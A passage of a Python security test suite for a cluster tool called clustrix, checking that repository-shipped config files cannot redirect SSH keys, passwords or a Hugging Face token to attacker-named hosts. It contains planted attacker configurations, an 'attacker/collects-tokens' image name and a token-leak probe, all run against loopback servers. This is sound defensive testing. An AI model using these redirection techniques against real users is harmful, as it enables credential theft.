        text=True,
    )
    known_hosts = pathlib.Path.home() / ".ssh" / "known_hosts"
    known_hosts.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    known_hosts.write_text(scan.stdout, encoding="utf-8")
    assert scan.stdout.strip(), "ssh-keyscan produced nothing to trust"


def test_key_deployment_does_not_offer_your_agent_to_a_repo_named_host(
    agent_only_server, agent_identity, env_file, tmp_path, monkeypatch
):
    """Route 13's seventh site, on the wire.

    Measured at ``9a7e54f`` with a ``./clustrix.yml`` naming only the host:
    ``RESULT True``, ``AUTH [('victim', 'publickey'), ('victim',
    'publickey')]`` and the requested key installed in the attacker's
    ``authorized_keys`` -- the agent identity authenticated through
    ``ssh-copy-id`` while the gate refused the same host in the same call.
    """
    from clustrix.ssh_utils import deploy_public_key

    if shutil.which("ssh-copy-id") is None:
        pytest.skip("ssh-copy-id is not installed")

    env_file()
    key, public = _a_key_pair_to_deploy(tmp_path)
    _trust_this_host_deliberately(agent_only_server)
    _repository_naming_only_the_host(agent_only_server, tmp_path, monkeypatch)

    with contextlib.suppress(Exception):
        deploy_public_key(
            agent_only_server.host,
            "victim",
            str(public),
            agent_only_server.port,
            None,
            config=get_config(),
        )

    assert agent_only_server.authentications == [], (
        "ssh-copy-id authenticated with an identity out of the ssh-agent to "
        "a host named by a working-directory file: "
        + repr(agent_only_server.authentications)
    )
    installed = pathlib.Path(agent_only_server.root) / ".ssh" / "authorized_keys"
    assert not installed.exists() or key.get_base64() not in installed.read_text()


def test_key_deployment_over_ssh_copy_id_still_works_for_a_chosen_host(
    agent_only_server, agent_identity, env_file, tmp_path
):
    """The control arm: this must not become a blanket disable.

    Same agent, same server, same ``ssh-copy-id`` path -- the only
    difference is that the host comes from ``~/.clustrix/config.yml``, which
    the user chose.
    """
    from clustrix.ssh_utils import deploy_public_key

    if shutil.which("ssh-copy-id") is None:
        pytest.skip("ssh-copy-id is not installed")

    env_file()
    key, public = _a_key_pair_to_deploy(tmp_path)
    _trust_this_host_deliberately(agent_only_server)
    (get_config_dir() / "config.yml").write_text(
        _config_text(agent_only_server), encoding="utf-8"
    )
    config_module._load_default_config()

    deployed = deploy_public_key(
        agent_only_server.host,
        "victim",
        str(public),
        agent_only_server.port,
        None,
        config=get_config(),
    )

    assert deployed is True
    assert agent_only_server.authentications, "nothing authenticated at all"
    installed = pathlib.Path(agent_only_server.root) / ".ssh" / "authorized_keys"
    assert key.get_base64() in installed.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Route 13, eighth site: OpenSSH reads the user's own ``~/.ssh/config``.
#
# ``IdentitiesOnly=yes`` keeps the identities "explicitly configured in the
# ssh_config files", and an ``IdentityFile`` the user's config supplies is
# one of those -- so the option added for the seventh site did not filter
# it. ``$HOME`` does not move that file either: OpenSSH resolves ``~`` from
# the passwd database, which is why no test may write to it and why the
# arms below hand ``ssh-copy-id`` a ``-F`` file standing in for it.
# ---------------------------------------------------------------------------


def _planted_ssh_config(tmp_path, identity):
    """A stand-in for the user's own ``~/.ssh/config``.

    The real one cannot be used: OpenSSH reads it from the passwd home
    rather than from ``$HOME`` (verified with ``ssh -G``, which reported
    ``/Users/<me>/.ssh/known_hosts`` with ``$HOME`` pointed at a tmpdir), so
    planting into it would edit the developer's own machine. ``-F`` is the
    same channel by a name a test can reach, and OpenSSH takes the *last*
    ``-F`` on the command line -- so passing this one first is exactly the
    situation clustrix is in: a user ssh_config offering an identity, and
    whatever clustrix says about ``-F`` deciding whether it is read.
    """
    path = tmp_path / "planted_ssh_config"
    path.write_text(f"Host *\n    IdentityFile {identity}\n", encoding="utf-8")
    return path


def _run_ssh_copy_id_under(planted, argv):
    """Run ``argv`` with ``planted`` standing in for the user's ssh_config."""
    return subprocess.run(
        [argv[0], "-F", str(planted)] + argv[1:],
        capture_output=True,
        text=True,
        timeout=60,
        env=dict(os.environ, SSH_AUTH_SOCK=""),
    )


def test_a_refused_ssh_copy_id_does_not_read_the_users_own_ssh_config(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """The eighth site, on the wire.

    Measured with otherwise identical flags before the fix: a ``Host * /
    IdentityFile`` stanza gave ``rc=0`` and ``[('victim', 'publickey')]``
    -- the victim's key authenticating to a host named by a
    working-directory file, straight through ``IdentitiesOnly=yes``,
    ``IdentityFile=<the key being deployed>`` and ``IdentityAgent=none``.
    """
    from clustrix.ssh_utils import NO_SSH_CONFIG, ssh_copy_id_command

    if shutil.which("ssh-copy-id") is None:
        pytest.skip("ssh-copy-id is not installed")

    env_file()
    _, public = _a_key_pair_to_deploy(tmp_path)
    _trust_this_host_deliberately(key_only_server)
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)
    victim_identity = pathlib.Path.home() / ".ssh" / "id_rsa"
    planted = _planted_ssh_config(tmp_path, victim_identity)

    argv = ssh_copy_id_command(
        str(public),
        "victim",
        key_only_server.host,
        key_only_server.port,
        local_identities=False,
        config=get_config(),
    )
    result = _run_ssh_copy_id_under(planted, argv)

    # The wire first: what the server saw is the measurement, and a
    # structural assertion placed ahead of it would turn a leak into a
    # lookup error on the argv.
    assert key_only_server.authentications == [], (
        "an identity out of the user's ssh_config authenticated to a host "
        "named by a working-directory file: " + repr(key_only_server.authentications)
    )
    assert result.returncode != 0
    assert [argv[i : i + 2] for i, item in enumerate(argv) if item == "-F"] == [
        ["-F", NO_SSH_CONFIG]
    ], f"the refused invocation left the user's ssh_config in play: {argv}"


def test_the_users_own_ssh_config_still_applies_to_a_host_they_chose(
    key_only_server, env_file, tmp_path
):
    """The control arm: this must not become a blanket ``-F /dev/null``.

    A user's ``ssh_config`` carries ``ProxyJump``, ``HostName``, ``Port``
    and ``User`` for the hosts they actually use, and throwing it away
    would break real deployments. So it is discarded on exactly the
    ``local_identities`` answer everything else here turns on, and this arm
    -- same server, same key, same code path, host from
    ``~/.clustrix/config.yml`` -- shows it is still read.
    """
    from clustrix.ssh_utils import ssh_copy_id_command

    if shutil.which("ssh-copy-id") is None:
        pytest.skip("ssh-copy-id is not installed")

    env_file()
    _, public = _a_key_pair_to_deploy(tmp_path)
    _trust_this_host_deliberately(key_only_server)
    (get_config_dir() / "config.yml").write_text(
        _config_text(key_only_server), encoding="utf-8"
    )
    config_module._load_default_config()
    victim_identity = pathlib.Path.home() / ".ssh" / "id_rsa"
    planted = _planted_ssh_config(tmp_path, victim_identity)

    argv = ssh_copy_id_command(
        str(public),
        "victim",
        key_only_server.host,
        key_only_server.port,
        local_identities=True,
        config=get_config(),
    )
    _run_ssh_copy_id_under(planted, argv)

    assert "-F" not in argv, f"a licensed invocation discarded ssh_config: {argv}"
    assert key_only_server.authentications, (
        "the user's own ssh_config was ignored for a host they chose, so "
        "the fix is an outage rather than a gate"
    )


# ---------------------------------------------------------------------------
# ``ssh_host_key_policy`` is a security decision, so an untrusted source may
# not make it. Weaponised, a ``./clustrix.yml`` carrying no credential at
# all removed the host key barrier -- and did it *persistently*, for every
# later process on the machine.
# ---------------------------------------------------------------------------


def test_a_working_directory_file_cannot_turn_host_key_checking_off(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """``auto_add`` from a file nobody chose is downgraded to ``reject``.

    ``_config_text`` writes ``ssh_host_key_policy: auto_add``, which is the
    whole payload: the file names a host and no credential of any kind.
    Before this, the gate refused (``GATE REFUSES: True``) while
    ``host_key_policy_name`` answered ``auto_add`` and the OpenSSH
    translation answered ``accept-new``.
    """
    from clustrix.ssh_security import (
        host_key_policy_name,
        may_weaken_host_key_checking,
        openssh_strict_host_key_checking,
    )

    env_file()
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)
    config = get_config()

    assert config.ssh_host_key_policy == "auto_add"
    assert may_weaken_host_key_checking(config) is False
    assert host_key_policy_name(config) == "reject"
    assert openssh_strict_host_key_checking(config) == "yes"


def test_the_host_key_policy_you_chose_yourself_still_applies(
    key_only_server, env_file
):
    """The control arm: ``auto_add`` is a supported opt-out and stays one."""
    from clustrix.ssh_security import (
        host_key_policy_name,
        may_weaken_host_key_checking,
        openssh_strict_host_key_checking,
    )

    env_file()
    (get_config_dir() / "config.yml").write_text(
        _config_text(key_only_server), encoding="utf-8"
    )
    config_module._load_default_config()
    config = get_config()

    assert may_weaken_host_key_checking(config) is True
    assert host_key_policy_name(config) == "auto_add"
    assert openssh_strict_host_key_checking(config) == "accept-new"
    assert host_key_policy_name(ClusterConfig(ssh_host_key_policy="auto_add")) == (
        "auto_add"
    )


def test_a_mapping_cannot_license_a_weakening_because_it_has_no_provenance():
    """The widget hands its form over as a dict, and a dict was never stamped.

    ``_save_config_from_widgets`` does not emit ``ssh_host_key_policy``
    today, so this costs nothing now; it is what stops the dict becoming a
    laundering route the day it does.
    """
    from clustrix.ssh_security import (
        host_key_policy_name,
        may_weaken_host_key_checking,
    )

    form = {"cluster_host": "someone.example", "ssh_host_key_policy": "auto_add"}

    assert may_weaken_host_key_checking(form) is False
    assert host_key_policy_name(form) == "reject"
    assert host_key_policy_name({"ssh_host_key_policy": "reject"}) == "reject"


def test_a_weaponised_run_leaves_nothing_trusted_for_the_next_process(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """The durable half, across two real interpreters.

    ``auto_add`` is not a per-process setting: it *appends to*
    ``~/.ssh/known_hosts``. Measured before the fix, in exactly this shape:
    process one wrote **8** entries, and process two -- a fresh
    interpreter, no attacker file anywhere, the default ``reject`` policy
    in force -- found the attacker's host already trusted for all three of
    its host key algorithms. Nothing clears that, so the write is the part
    that has to not happen.

    A second interpreter rather than a second function call because a
    process-global taint record cannot follow one, and following it is
    precisely what a persistent file does not need to do.
    """
    from clustrix.ssh_utils import deploy_public_key

    env_file()
    _, public = _a_key_pair_to_deploy(tmp_path)
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)

    with contextlib.suppress(Exception):
        deploy_public_key(
            key_only_server.host,
            "victim",
            str(public),
            key_only_server.port,
            None,
            config=get_config(),
        )

    known_hosts = pathlib.Path.home() / ".ssh" / "known_hosts"
    assert not known_hosts.exists() or known_hosts.read_text() == "", (
        "a working-directory file got the attacker's host key written into "
        "the global known_hosts: " + known_hosts.read_text()
    )

    program = (
        "import json,paramiko\n"
        "from clustrix.ssh_security import configure_host_key_policy\n"
        "client = paramiko.SSHClient()\n"
        "configure_host_key_policy(client, None)\n"
        "entry = client.get_host_keys().lookup('[%s]:%d')\n"
        "print(json.dumps(sorted(entry) if entry else []))\n"
        % (key_only_server.host, key_only_server.port)
    )
    completed = subprocess.run(
        [sys.executable, "-c", program],
        capture_output=True,
        text=True,
        cwd=str(pathlib.Path(__file__).resolve().parents[2]),
        env=dict(os.environ, HOME=str(pathlib.Path.home())),
        timeout=120,
    )

    assert completed.returncode == 0, completed.stderr
    assert json.loads(completed.stdout.strip().splitlines()[-1]) == [], (
        "a second, entirely fresh process found the attacker's host already "
        "trusted: " + completed.stdout
    )


# ---------------------------------------------------------------------------
# ``hf_image`` chooses the container that is handed CLUSTRIX_HF_TOKEN.
# ---------------------------------------------------------------------------


def test_a_working_directory_file_does_not_choose_the_container_for_your_token(
    tmp_path, monkeypatch
):
    """Same class as the host key policy: an untrusted source aiming a secret.

    A staged job hands ``CLUSTRIX_HF_TOKEN`` to the image as a job secret,
    so naming the image is naming the recipient -- and ``hf_image`` is an
    ordinary declared field.
    """
    from clustrix.hf_jobs import HFJobsManager

    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        "cluster_type: huggingface\n"
        "cluster_host: hf-victim.example\n"
        "hf_image: attacker/collects-tokens:latest\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(cloned_repository)
    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()

    config = get_config()

    assert config.hf_image == "attacker/collects-tokens:latest"
    assert get_config_source(config) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert HFJobsManager(config)._image() == (
        f"python:{sys.version_info.major}.{sys.version_info.minor}-slim"
    )


def test_the_container_image_you_chose_yourself_is_still_used():
    """The control arm: ``hf_image`` is a documented setting and stays one."""
    from clustrix.hf_jobs import HFJobsManager

    (get_config_dir() / "config.yml").write_text(
        "cluster_type: huggingface\n"
        "cluster_host: hf-mine.example\n"
        "hf_image: myorg/cuda-python:3.11\n",
        encoding="utf-8",
    )
    config_module._load_default_config()

    assert HFJobsManager(get_config())._image() == "myorg/cuda-python:3.11"
    assert (
        HFJobsManager(
            ClusterConfig(cluster_host="hf-mine2.example", hf_image="myorg/x:1")
        )._image()
        == "myorg/x:1"
    )


def _recording_listener():
    """A loopback HTTP server that records what was asked of it."""
    import http.server
    import socketserver
    import threading

    class Recorder(http.server.BaseHTTPRequestHandler):
        def _record(self):
            self.server.seen.append(
                (self.command, self.path, self.headers.get("Authorization"))
            )
            self.send_response(404)
            self.end_headers()

        do_GET = _record
        do_HEAD = _record

        def log_message(self, *args):
            pass

    server = socketserver.TCPServer(("127.0.0.1", 0), Recorder)
    server.seen = []
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def test_the_generated_job_bootstrap_pins_where_its_token_is_sent():
    """Route 13b, in the half of the tree that is a string.

    The container's ``hf_hub_download`` carries ``CLUSTRIX_HF_TOKEN``, and
    ``huggingface_hub`` fills ``endpoint`` in from ``$HF_ENDPOINT`` -- read
    from the *container's* environment, which a container image sets in its
    own ``ENV``. So the configuration field that chose the image also chose
    where the account token went.

    Both arms are measured with real loopback listeners, in a subprocess
    because ``huggingface_hub`` reads ``$HF_ENDPOINT`` at import: the
    unpinned call really does deliver ``Bearer <token>`` to whatever
    ``$HF_ENDPOINT`` names, and the pinned one does not.
    """
    pytest.importorskip("huggingface_hub")

    from clustrix.credential_release import HUGGINGFACE_ENDPOINT
    from clustrix.hf_jobs import _bootstrap_source

    assert f"endpoint={HUGGINGFACE_ENDPOINT!r}" in _bootstrap_source()

    pinned = _recording_listener()
    ambient = _recording_listener()
    try:
        pinned_url = f"http://127.0.0.1:{pinned.server_address[1]}"
        ambient_url = f"http://127.0.0.1:{ambient.server_address[1]}"
        # Assembled from parts, like SENTINEL_PASSWORD, so that no
        # credential-shaped literal appears anywhere in this source file.
        probe_token = "-".join(["clustrix", "probe", "token"])
        program = (
            "from huggingface_hub import hf_hub_download\n"
            "for extra in ({}, {'endpoint': %r}):\n"
            "    try:\n"
            "        hf_hub_download(repo_id='someone/payload',\n"
            "                        filename='p.b64', repo_type='dataset',\n"
            "                        token=%r, **extra)\n"
            "    except Exception:\n"
            "        pass\n" % (pinned_url, probe_token)
        )
        completed = subprocess.run(
            [sys.executable, "-c", program],
            capture_output=True,
            text=True,
            env=dict(
                os.environ,
                HF_ENDPOINT=ambient_url,
                HF_HOME=str(pathlib.Path.home() / ".hf-probe"),
            ),
            timeout=180,
        )
        assert completed.returncode == 0, completed.stderr

        def downloads(listener):
            return [entry[2] for entry in listener.seen if "/resolve/" in entry[1]]

        assert downloads(ambient) == [f"Bearer {probe_token}"], (
            "the unpinned arm did not reach $HF_ENDPOINT, so this test would "
            "pass without the pinning: " + repr(ambient.seen)
        )
        assert downloads(pinned) == [f"Bearer {probe_token}"]
    finally:
        pinned.shutdown()
        ambient.shutdown()


def test_the_options_the_subprocess_rule_demands_really_stop_rsync(
    agent_only_server, agent_identity, tmp_path
):
    """P5 on the wire, both arms: the rule must ask for something that works.

    ``rsync`` is in :data:`OPENSSH_CONNECTING_PROGRAMS` because it is not a
    transport of its own -- given a ``host:path`` it execs ``ssh`` and
    inherits every default. Unpinned it authenticated ``('victim',
    'publickey')`` out of the ssh-agent while the previous rule reported
    nothing about it.

    The pinned arm matters as much: an option list that did not actually
    close the agent would be a rule demanding a ritual. ``rsync`` has no
    ``-o``; the options go in ``-e``, which is why this is worth measuring
    rather than assuming.
    """
    if shutil.which("rsync") is None:
        pytest.skip("rsync is not installed")

    payload = tmp_path / "payload.txt"
    payload.write_text("x\n", encoding="utf-8")
    ssh_config = tmp_path / "rsync_ssh_config"
    ssh_config.write_text(
        "Host *\n"
        "  StrictHostKeyChecking no\n"
        f"  UserKnownHostsFile {pathlib.Path.home() / '.ssh' / 'known_hosts'}\n",
        encoding="utf-8",
    )

    def rsync(transport, name):
        subprocess.run(
            [
                "rsync",
                "-a",
                "-e",
                transport,
                str(payload),
                f"victim@{agent_only_server.host}:{name}",
            ],
            capture_output=True,
            text=True,
            timeout=60,
        )

    base = f"ssh -F {ssh_config} -p {agent_only_server.port}"
    rsync(base, "unpinned.txt")
    unpinned = list(agent_only_server.authentications)
    rsync(
        f"{base} -o IdentitiesOnly=yes -o IdentityAgent=none",
        "pinned.txt",
    )
    pinned = agent_only_server.authentications[len(unpinned) :]

    assert (
        unpinned
    ), "rsync did not reach the server at all, so neither arm means anything"
    assert set(unpinned) == {("victim", "publickey")}
    assert pinned == [], (
        "the options this rule demands did not actually close the agent for "
        "rsync: " + repr(pinned)
    )


def test_copying_a_found_configuration_carries_its_provenance(tmp_path, monkeypatch):
    """The same defect at the function it lives in, without a server.

    The sidecars are asserted directly so that a future change which happens
    to keep the wire safe by some other accident still fails here.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget._on_add_config(None)

    assert widget.current_config_name == "New Configuration"
    assert widget.config_source_map["New Configuration"] == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )
    assert widget.config_source_host_map["New Configuration"] == (
        UNRELATED_ATTACKER_HOST
    )
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )

    # The original is untouched: copying is not moving.
    assert widget.config_source_map["config"] == CONFIG_SOURCE_WORKING_DIRECTORY

    # ``config_file_map`` deliberately does not come along -- the copy is a
    # configuration no file holds, and that map decides which entries a save
    # writes back, not who may receive a credential.
    assert "New Configuration" not in widget.config_file_map


def test_copying_after_typing_your_own_hostname_does_not_condemn_it(
    tmp_path, monkeypatch
):
    """And the fix is not "condemn every copy".

    A hostname is only condemned by a source that actually named it, so a
    copy taken *after* the user typed their own host carries nothing. This
    is the branch that clears the sidecars rather than writing them.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget.host_field.value = "my-own-cluster.example"
    widget._on_add_config(None)

    assert widget.current_config_name == "New Configuration"
    assert "New Configuration" not in widget.config_source_map
    assert "New Configuration" not in widget.config_source_host_map
    assert widget._discovered_source_for(_live_widget_fields(widget)) is None


# --------------------------------------------------------------------------
# The family, not the door. Two of these leaked -- the rename (9b) and the
# copy (11) -- each found separately, each the same mistake: an operation
# that creates, moves or removes a configuration *name* without moving what
# is keyed by that name. So every such operation is walked here, and the
# invariant is asserted directly rather than one leak at a time.
# --------------------------------------------------------------------------


def _sidecar_names(widget):
    return (
        set(widget.config_source_map)
        | set(widget.config_source_host_map)
        | set(widget.config_file_map)
    )


@pytest.mark.parametrize(
    "door",
    [
        "rename",
        "copy",
        "delete",
        "paste_over_the_found_name",
        "paste_under_a_new_name",
        "save",
        "select_another",
    ],
)
def test_no_name_mutating_door_leaves_a_sidecar_describing_a_dead_name(
    door, tmp_path, monkeypatch
):
    """A sidecar keyed by a name that no longer exists is the whole bug.

    It stops describing the configuration it was about (the leak) and starts
    describing whatever is named that next (the false refusal). Neither is
    visible from any single door, which is why this walks all of them.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    assert _sidecar_names(widget) == {"config"}

    pasted = "\n".join(
        [
            "name: {name}",
            "cluster_type: ssh",
            f"cluster_host: {UNRELATED_ATTACKER_HOST}",
            "username: victim",
        ]
    )
    if door == "rename":
        widget.config_name.value = "mine"
    elif door == "copy":
        widget._on_add_config(None)
    elif door == "delete":
        widget._on_delete_config(None)
    elif door == "paste_over_the_found_name":
        widget.load_config_text.value = pasted.format(name="config") + "\n"
        widget._on_load_config(None)
    elif door == "paste_under_a_new_name":
        widget.load_config_text.value = pasted.format(name="fresh") + "\n"
        widget._on_load_config(None)
    elif door == "save":
        widget._on_save_config(None)
    elif door == "select_another":
        widget.config_dropdown.value = "Local Single-core"
    else:  # pragma: no cover - the parametrisation is the whole list
        raise AssertionError(door)

    orphaned = _sidecar_names(widget) - set(widget.configs)
    assert orphaned == set(), (
        f"the {door!r} door left provenance keyed by a configuration that no "
        f"longer exists: {sorted(orphaned)}"
    )


def test_pasting_over_a_found_configuration_does_not_launder_it(tmp_path, monkeypatch):
    """The Load box is a paste, but the name it lands on may not be free.

    Pasting is the user typing, so a *new* name is ``runtime`` and that is
    right. Pasting onto the name a discovered file already holds is the
    interesting one, and it has to keep the refusal: the text a user pastes
    is very often text a repository's README told them to paste, so clearing
    the provenance here would be a second copy of route 11 with the file
    replaced by an instruction.

    Stated precisely, because "the paste door fails closed" was an
    overstatement: it **fails closed against a host-preserving paste**, and
    only that. The provenance is retained on the name, but
    ``_discovered_source_for`` condemns a configuration only while the live
    host is still the host the file named, so changing the hostname by one
    character returns ``None`` and Apply stamps ``runtime`` -- in the
    single- and multi-configuration branches alike. That is not a hole; it
    is the declared rule that a hostname is only condemned by a source that
    actually named it (see
    ``test_typing_your_own_hostname_over_a_found_config_does_not_condemn_it``),
    and pasting a hostname is typing it. The converse is what matters here
    and is what this test measures.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget.load_config_text.value = "\n".join(
        [
            "name: config",
            "cluster_type: ssh",
            f"cluster_host: {UNRELATED_ATTACKER_HOST}",
            "username: victim",
        ]
    )
    widget._on_load_config(None)

    assert widget.current_config_name == "config"
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )


def test_saving_a_found_configuration_to_your_own_directory_does_not_adopt_it(
    tmp_path, monkeypatch
):
    """Writing it out is not the same as saying you meant it.

    ``_on_save_config`` updates ``config_file_map`` so the next save knows
    where the configuration lives. If it updated the *source* maps too,
    pressing Save would silently promote a file a repository shipped to the
    user's own -- adoption has to stay an explicit act.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget._on_save_config(None)

    assert widget.config_source_map == {"config": CONFIG_SOURCE_WORKING_DIRECTORY}
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )


# --------------------------------------------------------------------------
# Route 12. The laundering happens on disk, one restart later.
#
# Every in-memory door above is closed, and the audit that closed them could
# not see this one: after Save, every sidecar is still correct. Save writes
# into ``get_config_dir()``, and ``detect_config_files`` infers trust from
# exactly that directory, so the *next* session re-derives the source from
# where the file now sits and gets ``user-config-dir``.
#
# The precondition is attacker-controlled, because the filename comes from
# the configuration's own ``name``: ``""`` and ``Config`` both save as
# ``config.yml``, ``clustrix`` saves as ``clustrix.yml``, and all three are
# names ``detect_config_files`` looks for. ``My Cluster`` saves as
# ``my_cluster.yml`` and does not promote.
#
# A save also writes *every* configuration in the dropdown, verbatim, so the
# entry that reaches the wire need not be the one the user selected.
#
# Two real interpreters, each with its own ``$HOME``, and the only channel
# between them is the file Save wrote. The host is a real ``LocalSSHServer``
# that accepts the sentinel and nothing else, so an entry in
# ``authentications`` is a measurement rather than an inference.
# --------------------------------------------------------------------------

_ROUTE_12_REPO_ROOT = str(pathlib.Path(clustrix.__file__).parent.parent)


def _session(script, home, cwd, extra_env=None, tree=None, check=True):
    """Run ``script`` in a real fresh interpreter rooted at ``home``.

    ``tree`` pins ``PYTHONPATH``, so a caller can point the child at a
    ``git archive`` of an earlier commit and measure what that release did.
    ``check=False`` returns the completed process instead of asserting on the
    exit status, for the arms where the earlier release is expected to fail.
    """
    environment = dict(os.environ)
    environment.pop("CLUSTRIX_CONFIG_DIR", None)
    for name in SSH_ENV_NAMES:
        environment.pop(name, None)
    environment["HOME"] = str(home)
    environment["USERPROFILE"] = str(home)
    environment["PYTHONPATH"] = tree or _ROUTE_12_REPO_ROOT
    environment["PYTHONDONTWRITEBYTECODE"] = "1"
    environment.update(extra_env or {})
    completed = subprocess.run(
        [sys.executable, "-c", textwrap.dedent(script)],
        env=environment,
        cwd=str(cwd),
        capture_output=True,
        text=True,
        timeout=180,
    )
    if not check:
        return completed
    assert completed.returncode == 0, (
        f"session failed ({completed.returncode}):\n"
        f"--- stdout ---\n{completed.stdout}\n--- stderr ---\n{completed.stderr}"
    )
    return json.loads(completed.stdout.strip().splitlines()[-1])


#: Session one: the user opens the widget inside the cloned repository,
#: selects the configuration the project ships, and presses Save.
_ROUTE_12_SESSION_ONE = """
    import json
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    widget.config_dropdown.value = "Config"
    before = dict(widget.config_source_map)
    widget._on_save_config(None)
    print(json.dumps({
        "source_map_before": before,
        "source_map_after": dict(widget.config_source_map),
        "current": widget.current_config_name,
    }))
"""

#: Session two: a fresh widget somewhere else entirely, which has never seen
#: the repository. It selects a configuration, applies it and connects.
_ROUTE_12_SESSION_TWO = """
    import json, os
    from clustrix.config import (
        config_source_is_trusted,
        configure,
        get_config,
        get_config_source,
    )
    from clustrix.executor_connections import ConnectionManager
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    # The user's own documented setting, and a configure() call naming no
    # host, so it stamps nothing: _save_config_from_widgets never emits
    # ssh_host_key_policy, and without it the connection never gets as far
    # as offering a password.
    configure(ssh_host_key_policy="auto_add")

    widget = EnhancedClusterConfigWidget()
    options = list(widget.config_dropdown.options)
    source_map = dict(widget.config_source_map)
    widget.config_dropdown.value = os.environ["CLUSTRIX_TEST_PICK"]
    widget._on_apply_config(None)
    applied = {
        "host": get_config().cluster_host,
        "source": get_config_source(get_config()),
        "trusted": config_source_is_trusted(get_config()),
    }
    manager = ConnectionManager(get_config())
    try:
        manager.setup_ssh_connection()
        authenticated = manager.ssh_client.get_transport().is_authenticated()
    except Exception:
        authenticated = False
    finally:
        manager.disconnect()
    print(json.dumps({
        "options": options,
        "source_map": source_map,
        "applied": applied,
        "authenticated": authenticated,
    }))
"""


def _route_12_home(tmp_path):
    """A throwaway ``$HOME`` holding the documented ``.env`` and nothing else."""
    home = tmp_path / "home"
    (home / ".clustrix").mkdir(mode=0o700, parents=True)
    env_path = home / ".clustrix" / ".env"
    env_path.write_text(f"SSH_PASSWORD={SENTINEL_PASSWORD}\n", encoding="utf-8")
    env_path.chmod(0o600)
    return home


def test_saving_a_found_configuration_does_not_promote_it_across_a_restart(
    attacker_server, tmp_path
):
    """Route 12. RED before the fix: ``user-config-dir``, and the leak.

    Measured before it, on the wire: session two's ``config_source_map`` was
    ``{'Config': 'user-config-dir', 'project': 'user-config-dir'}``, Apply
    stamped ``user-config-dir``, ``config_source_is_trusted`` was ``True``
    and ``attacker_server.authentications`` held ``('victim', 'password')``.

    ``project`` is the entry the user never selected. It rides along because
    a save writes every configuration in the dropdown verbatim, and it is
    the one that reaches the wire because it carries ``name: ''`` -- the
    only state in which Apply applies anything, since
    ``_save_config_from_widgets`` emits ``name`` and ``configure()`` rejects
    it (issue #165). ``Config`` is what drives the *filename*: it is the
    entry the user selects, and ``Config`` saves as ``config.yml``.
    """
    pytest.importorskip("ipywidgets")
    home = _route_12_home(tmp_path)
    repository = tmp_path / "cloned-repository"
    repository.mkdir()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()

    entry = [
        "  cluster_type: ssh",
        f"  cluster_host: {attacker_server.host}",
        f"  cluster_port: {attacker_server.port}",
        "  username: victim",
        "  ssh_host_key_policy: auto_add",
    ]
    (repository / "config.yml").write_text(
        "\n".join(["Config:"] + entry + ["project:"] + entry + ["  name: ''"]) + "\n",
        encoding="utf-8",
    )

    first = _session(_ROUTE_12_SESSION_ONE, home, repository)
    assert first["source_map_before"] == {
        "Config": CONFIG_SOURCE_WORKING_DIRECTORY,
        "project": CONFIG_SOURCE_WORKING_DIRECTORY,
    }
    # The in-memory invariant the audit checked really does still hold, so
    # this test says something the audit could not have.
    assert first["source_map_after"] == first["source_map_before"]
    written = home / ".clustrix" / "config.yml"
    assert written.exists(), "Save did not write the promoting filename"

    second = _session(
        _ROUTE_12_SESSION_TWO,
        home,
        elsewhere,
        {"CLUSTRIX_TEST_PICK": "project"},
    )
    assert second["applied"]["host"] == attacker_server.host
    assert attacker_server.authentications == [], (
        "the stored password was sent to a host a cloned repository named, "
        "because Save had copied its configuration into the user's own "
        "configuration directory: " + repr(attacker_server.authentications)
    )
    assert not second["authenticated"]
    assert second["source_map"] == {
        "Config": CONFIG_SOURCE_WORKING_DIRECTORY,
        "project": CONFIG_SOURCE_WORKING_DIRECTORY,
    }, "pressing Save promoted a configuration the repository shipped"
    assert second["applied"]["source"] == CONFIG_SOURCE_WORKING_DIRECTORY
    assert second["applied"]["trusted"] is False


def test_saving_a_configuration_you_built_yourself_is_still_yours_next_session(
    attacker_server, tmp_path
):
    """The control. Without it the fix could be "record everything as bad".

    Nothing is discovered here: the user picks a template, types their own
    hostname and saves it as ``config.yml``. Nothing is recorded in the
    file, the next session derives ``user-config-dir`` from where it sits,
    and the credential is released -- which is the whole point of being able
    to save at all.
    """
    pytest.importorskip("ipywidgets")
    home = _route_12_home(tmp_path)
    workdir = tmp_path / "work"
    workdir.mkdir()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()

    build_it = """
        import json, os
        from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

        widget = EnhancedClusterConfigWidget()
